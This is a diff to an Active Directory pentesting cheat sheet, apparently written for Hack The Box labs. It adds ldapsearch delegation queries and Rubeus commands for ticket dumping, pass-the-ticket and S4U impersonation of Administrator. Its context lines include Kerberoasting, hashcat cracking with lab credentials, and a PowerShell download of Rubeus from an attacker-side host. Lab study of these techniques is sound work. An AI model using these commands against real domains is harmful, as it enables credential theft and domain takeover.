@@ -26,8 +26,9 @@ hashcat -m 18200 creds.txt /usr/share/wordlists/rockyou.txt
 
 **[LDAPSearch Cheat Sheet](https://notes.benheater.com/books/active-directory/page/ldapsearch)**
 ```
-Domain Contexts: ldapsearch -x -H ldap://BLACKFIELD -s base namingcontexts
-Search Users: ldapsearch -x -H ldap://BLACKFIELD -D 'CN=support,CN=users,DC=BLACKFIELD,DC=local' -W -b 'DC=BLACKFIELD,DC=local' '(objectClass=user)'
+ldapsearch -x -H ldap://BLACKFIELD -s base namingcontexts (Domain Contexts)
+ldapsearch -x -H ldap://BLACKFIELD -D 'CN=support,CN=users,DC=BLACKFIELD,DC=local' -W -b 'DC=BLACKFIELD,DC=local' '(objectClass=user)' (Search Users)
+ldapsearch -H ldap://192.168.110.55 -x -D "web_svc@painters.htb" -W -b "dc=painters,dc=htb" "(msDS-AllowedToDelegateTo=*)" msDS-AllowedToDelegateTo (Constrained Delegation)
 ```
 
 **[Share Enumeration]**
@@ -120,6 +121,11 @@ Get-ObjectAcl -DistinguishedName "DC=htb,DC=local" -ResolveGUIDs | Where-Object 
 GetUserSPNs.py -request active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
 hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force
 ```
+
+**[Constrained Delegation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/constrained-delegation)**
+
+**Additional Resources**
+  - [Using altservice to generate LDAP TGS](https://medium.com/r3d-buck3t/attacking-kerberos-constrained-delegations-4a0eddc5bb13#3276)
 
 ## Lateral Movement
 [ForceChangePassword](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword)
@@ -224,6 +230,16 @@ powershell -Command "Invoke-WebRequest -Uri 'http://192.168.110.51:1235/Rubeus.e
 ```
 Rubeus.exe dump /luci:0x599ac7 /service:CIFS/dc.painters.htb /nowrap /outfile [dump to kirbi files]
 Rubeus.exe asktgt /user:blake /password:Password123! /domain:PAINTERS.HTB /dc:192.168.110.55 [request for TGT using credentials]
+Rubeus.exe ptt /ticket:test.kirbi (import ticket)
+Rubeus.exe tgtdeleg /user:blake /password:Password123! /domain:PAINTERS.HTB /target:CIFS/dc.painters.htb /nowrap (ticket delegation with TGT to obtain TGS of target service)
+Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dc.painters.htb" /user:blake /ticket:test.kirbi /nowrap (Access to CIFS/dc.painters.htb)
+
+
+**For Linux use:**
+base64 -d ticket.kirbi.b64 > ticket.kirbi
+ticketConverter.py cifs.kirbi cifs.ccache
+export KRB5CCNAME=cifs.ccache
+sudo apt-get install krb5-user
 ```
 
 **[Mimikatz](https://github.com/gentilkiwi/mimikatz/releases)**
